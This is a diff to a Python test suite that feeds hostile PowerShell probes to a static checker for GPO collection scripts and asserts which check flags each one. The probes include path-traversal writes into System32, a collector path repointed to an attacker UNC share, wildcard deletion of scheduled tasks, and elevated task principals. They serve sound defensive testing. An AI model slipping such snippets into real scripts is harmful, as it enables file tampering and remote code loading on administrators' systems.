+        "r2_task_unregister_wildcard",
+        "Register-GpoLensCollection.ps1",
+        "append",
+        "Unregister-ScheduledTask -TaskName '*' -Confirm:$false\n",
+    ),
+    (
+        "r2_task_register_remote_cimsession",
+        "Register-GpoLensCollection.ps1",
+        "append",
+        "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
+        "-CimSession 'server.example.test' -Force | Out-Null\n",
+    ),
+    (
+        "r2_task_principal_runlevel_highest",
+        "Register-GpoLensCollection.ps1",
+        "append",
+        "$principal = New-ScheduledTaskPrincipal -UserId $account "
+        "-LogonType Password -RunLevel Highest\n",
+    ),
+    # BL-4: pinned root plus unchecked child data.
+    (
+        "r2_env_via_second_variable",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$segment = $env:GPO_LENS_ESCAPE\n"
+        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
+    ),
+    (
+        "r2_dotdot_via_second_variable",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$segment = '..\\..\\Windows\\Temp\\gate.txt'\n"
+        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
+    ),
+    (
+        "r2_computed_dotdot_via_second_variable",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$segment = ([char]46) + ([char]46) + '\\Windows\\Temp\\gate.txt'\n"
+        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
+    ),
+    (
+        "r2_new_item_name_traversal",
+        "Export-GpoEstate.ps1",
+        "append",
+        "New-Item -Path $OutputRoot -Name '..\\..\\Windows\\Temp\\gate.txt' "
+        "-ItemType File -Force | Out-Null\n",
+    ),
+    # --- DeepSeek round-2 candidates ---
+    # NEW-BL-1: `..` carried in a non-root child variable / other write forms.
+    (
+        "ds_dotdot_child_var",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$sub = '..\\..\\..\\..\\Windows\\System32\\evil.dll'\n"
+        "Set-Content -LiteralPath (Join-Path $OutputRoot $sub) -Value 'owned'\n",
+    ),
+    (
+        "ds_interp_child",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$sub = '..\\..\\x'\nSet-Content -LiteralPath \"$OutputRoot\\$sub\" -Value 'owned'\n",
+    ),
+    (
+        "ds_writealltext_child",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$sub = '..\\..\\x'\n[IO.File]::WriteAllText((Join-Path $OutputRoot $sub), 'owned')\n",
+    ),
+    (
+        "ds_copyitem_child",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$sub = '..\\..\\x'\n"
+        "Copy-Item -LiteralPath $testFile -Destination (Join-Path $OutputRoot $sub) -Force\n",
+    ),
+    (
+        "ds_getgporeport_child",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$sub = '..\\..\\x'\n"
+        "Get-GPOReport -All -ReportType Xml -Path (Join-Path $OutputRoot $sub)\n",
+    ),
+    (
+        "ds_function_wrapped_write",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$sub = '..\\..\\x'\n"
+        "function Invoke-GateWrite { Set-Content -LiteralPath (Join-Path $OutputRoot $sub) "
+        "-Value 'owned' }\nInvoke-GateWrite\n",
+    ),
+    # NEW-BL-2: scope-qualified and foreach rebinds of pinned roots / exec sink.
+    (
+        "ds_script_scope_outputroot",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$script:OutputRoot = 'C:\\Windows\\System32'\n"
+        "Set-Content -LiteralPath (Join-Path $OutputRoot 'evil.dll') -Value 'owned'\n",
+    ),
+    (
+        "ds_foreach_abs_root",
+        "Export-GpoEstate.ps1",
+        "append",
+        "$evil = 'C:\\Windows\\System32'\n"
+        "foreach ($OutputRoot in $evil) { Set-Content -LiteralPath "
+        "(Join-Path $OutputRoot 'evil.dll') -Value 'owned' }\n",
+    ),
+    (
+        "ds_script_collectorpath",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "$script:CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
+    ),
+    (
+        "ds_script_windowsroot",
+        "Register-GpoLensCollection.ps1",
+        "append",
+        "$script:windowsRoot = 'C:\\attacker'\n",
+    ),
+    (
+        "ds_script_logpath",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "$script:LogPath = 'C:\\Windows\\System32\\evil.log'\n",
+    ),
 ]
+
+# NON-BL-3: the regression suite asserts WHICH substantive check flagged each
+# probe, not merely that one did (so a parse error can never masquerade as a
+# catch). Maps probe id -> the check name expected to raise.
+_PROBE_EXPECTED_CHECK: dict[str, str] = {
+    "sol_root_rebind": "pinned_bindings",
+    "sol_registry_rebind": "pinned_bindings",
+    "sol_set_itemtype": "writes",
+    "sol_redirection": "redirections",
+    "sol_redirection_stream": "redirections",
+    "sol_get_gporeport_path": "writes",
+    "sol_instance_delete": "dotnet",
+    "sol_adsi_delete": "types",
+    "sol_using_module": "usings",
+    "sol_collector_rebind": "pinned_bindings",
+    "sol_task_abuse": "task_action",
+    "ds_writeroot_var": "pinned_bindings",
+    "ds_writeroot_run": "pinned_bindings",
+    "ds_adsi_copyto_marker": "types",
+    "ds_register_args": "task_action",
+    "ds_using_assembly": "usings",
+    "neg_set_adobject": "commands",
+    "neg_adsi_commit": "types",
+    "neg_dynamic_member": "dotnet",
+    "neg_com": "new_object_and_add_type",
+    "neg_namespace_de": "usings",
+    "neg_splat_write": "writes",
+    "neg_addtype_inline": "new_object_and_add_type",
+    "neg_import_module_unc": "commands",
+    "r2_outvariable_rebind_root": "pinned_bindings",
+    "r2_pipelinevariable_rebind_root": "pinned_bindings",
+    "r2_errorvariable_rebind_root": "pinned_bindings",
+    "r2_warningvariable_rebind_root": "pinned_bindings",
+    "r2_informationvariable_rebind_root": "pinned_bindings",
+    "r2_collectorpath_outvariable_override": "pinned_bindings",
+    "r2_taskargs_outvariable_override": "pinned_bindings",
+    "r2_parenthesized_receiver_delete": "instance_receivers",
+    "r2_parenthesized_receiver_open_write": "instance_receivers",
+    "r2_parenthesized_fileinfo_copyto_sysvol": "instance_receivers",
+    "r2_wmi_remote_instance_delete": "types",
+    "r2_taskname_direct_rebind": "pinned_bindings",
+    "r2_task_unregister_wildcard": "task_action",
+    "r2_task_register_remote_cimsession": "task_action",
+    "r2_task_principal_runlevel_highest": "task_action",
+    "r2_env_via_second_variable": "writes",
+    "r2_dotdot_via_second_variable": "writes",
+    "r2_computed_dotdot_via_second_variable": "writes",
+    "r2_new_item_name_traversal": "writes",
+    "ds_dotdot_child_var": "writes",
+    "ds_interp_child": "writes",
+    "ds_writealltext_child": "writes",
+    "ds_copyitem_child": "writes",
+    "ds_getgporeport_child": "writes",
+    "ds_function_wrapped_write": "writes",
+    "ds_script_scope_outputroot": "pinned_bindings",
+    "ds_foreach_abs_root": "pinned_bindings",
+    "ds_script_collectorpath": "pinned_bindings",
+    "ds_script_windowsroot": "pinned_bindings",
+    "ds_script_logpath": "pinned_bindings",
+}
 
 
 def _modified_inventory(
@@ -1180,14 +1841,31 @@ def _modified_inventory(
     return _run_dumper(exe, [str(copy / name) for name in sorted(POLICIES)])
 
 
+def test_every_probe_has_an_expected_check() -> None:
+    ids = {p[0] for p in _REGRESSIONS}
+    assert ids == set(_PROBE_EXPECTED_CHECK), (
+        "every probe needs an expected check: "
+        f"missing {sorted(ids - set(_PROBE_EXPECTED_CHECK))}, "
+        f"stale {sorted(set(_PROBE_EXPECTED_CHECK) - ids)}"
+    )
+
+
 @pytest.mark.parametrize("probe", _REGRESSIONS, ids=[p[0] for p in _REGRESSIONS])
 def test_reviewer_probes_are_flagged(tmp_path: Path, probe: tuple[str, str, str, str]) -> None:
     probe_id, base, position, snippet = probe
     exe = _pwsh()
     extra = {"GateEvil.psm1": "'x' > './canary.txt'\n"} if "using_module" in probe_id else None
     inv = _modified_inventory(exe, base, position, snippet, tmp_path, extra)
-    with pytest.raises(AssertionError):
-        run_all_checks(base, inv)
+    failed = _run_checks(base, inv)
+    expected = _PROBE_EXPECTED_CHECK[probe_id]
+    # The probe must be caught by its intended substantive check, not by a parse
+    # error (NON-BL-3). The `using` probes deliberately fail parsing too, so
+    # `parse` is tolerated only there.
+    if "using" not in probe_id:
+        assert "parse" not in failed, f"{probe_id}: flagged only by a parse error: {failed}"
+    assert expected in failed, (
+        f"{probe_id}: expected check {expected!r} did not flag it; raised {sorted(failed)}"
+    )
 
 
 def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
